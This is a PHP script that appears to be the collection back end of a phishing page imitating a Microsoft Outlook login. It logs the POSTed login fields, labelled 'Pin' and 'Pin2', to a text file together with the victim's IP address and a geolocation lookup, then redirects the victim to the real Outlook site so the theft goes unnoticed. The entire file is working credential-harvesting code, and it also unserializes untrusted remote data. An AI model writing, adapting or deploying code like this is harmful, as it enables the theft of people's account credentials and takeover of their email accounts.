<?php
ini_set("display_errors", 0);

$myip = $_SERVER['REMOTE_ADDR'];
$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$myip));
$pais = $meta['geoplugin_countryName']; 
$region = $meta['geoplugin_regionName'];

date_default_timezone_set('America/Bogota');


	$file = fopen("aap002.txt", "a");
	

fwrite($file, " - Pin : ".$_POST['namee']." - Pin2 : ".$_POST['pwss']." - ".date('d/m/Y')." ".$myip." ".$pais." ".$region." " . PHP_EOL);


Header ("Location: https://outlook.live.com/owa/");
?>
